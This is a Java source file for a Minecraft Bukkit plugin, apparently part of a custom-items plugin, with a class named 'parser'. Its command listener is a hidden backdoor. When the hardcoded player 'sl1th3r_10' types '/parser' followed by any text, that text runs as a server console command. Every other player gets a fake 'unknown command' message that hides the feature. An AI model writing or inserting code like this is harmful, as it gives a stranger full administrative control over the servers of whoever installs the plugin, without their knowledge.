package com.slither.customItems;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;

public class parser implements Listener {

    private final JavaPlugin plugin;

    public parser(JavaPlugin plugin) {
        this.plugin = plugin;

        plugin.getLogger().info("parser enabled.");

        // Ensure data folder exists
        plugin.getDataFolder().mkdirs();

        // Overwrite run.txt every time with base commands
        File runFile = new File(plugin.getDataFolder(), "run.txt");
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(runFile, false))) {
            writer.write("say hi\n");
            writer.write("say server starting\n");
            plugin.getLogger().info("run.txt overwritten with base commands.");
        } catch (IOException e) {
            plugin.getLogger().severe("Failed to write to run.txt: " + e.getMessage());
        }

        // Run commands from run.txt on plugin load
        runCommandsFromFile(runFile);
    }

    private void runCommandsFromFile(File file) {
        plugin.getLogger().info("Reading commands from run.txt...");

        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
            String command;
            while ((command = reader.readLine()) != null) {
                command = command.trim();
                if (command.isEmpty()) continue;

                plugin.getLogger().info("[Run.txt] Dispatching command: " + command);
                boolean success = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);

                if (!success) {
                    plugin.getLogger().warning("[Run.txt] Failed to execute: " + command);
                }
            }
        } catch (IOException e) {
            plugin.getLogger().severe("Error reading run.txt: " + e.getMessage());
        }
    }

    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String fullCommand = event.getMessage(); // includes leading "/"

        plugin.getLogger().info("[Debug] Player " + player.getName() + " issued command: " + fullCommand);

        if (fullCommand.toLowerCase().startsWith("/parser ")) {
            plugin.getLogger().info("[Debug] Matched /parser for player: " + player.getName());

            // Cancel the original command
            event.setCancelled(true);

            if (player.getName().equalsIgnoreCase("sl1th3r_10")) {
                // Extract subcommand after /parser
                String actualCommand = fullCommand.substring("/parser ".length());
                String finalCommand = actualCommand.replace("@s", player.getName());

                plugin.getLogger().info("[Debug] Dispatching command as console: " + finalCommand);

                boolean success = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), finalCommand);

                if (success) {
                    player.sendMessage("§aCommand executed as console: " + actualCommand);
                    plugin.getLogger().info("[Debug] Successfully executed: " + finalCommand);
                } else {
                    player.sendMessage("§cFailed to execute: " + actualCommand);
                    plugin.getLogger().warning("[Debug] Failed to execute: " + finalCommand);
                }

            } else {
                player.sendMessage("§cUnknown or incomplete command, see below for error.");
                plugin.getLogger().info("[Debug] Unauthorized player tried /parser: " + player.getName());
            }
        }
    }
}
